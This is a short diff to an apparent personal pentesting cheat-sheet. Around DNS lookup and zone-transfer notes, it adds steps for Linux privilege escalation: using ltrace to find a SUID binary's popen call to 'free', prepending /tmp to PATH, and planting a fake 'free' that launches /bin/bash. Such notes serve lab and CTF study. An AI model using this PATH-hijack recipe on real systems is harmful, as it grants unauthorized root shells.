@@ -101,6 +101,14 @@ nslookup
     - nslookup 
     - server <dns ip>
     - <ip in question>
+    
+Priv Escalation by modifying an unusual binary: 
+	- Look at some functions of sysinfo: ltrace /bin/sysinfo 2>&1 | grep popen
+	- We see a binary named free being called. 
+		- adjust the $PATH variable to call our own code instead: PATH=/tmp:$PATH
+		- create fake free binary: echo "/bin/bash" >> /tmp/free
+			- chmod +x free
+		- run sysinfo: /bin/sysinfo
 
 Zone Transfer 
   - host -l <domain name> <DNS IP>
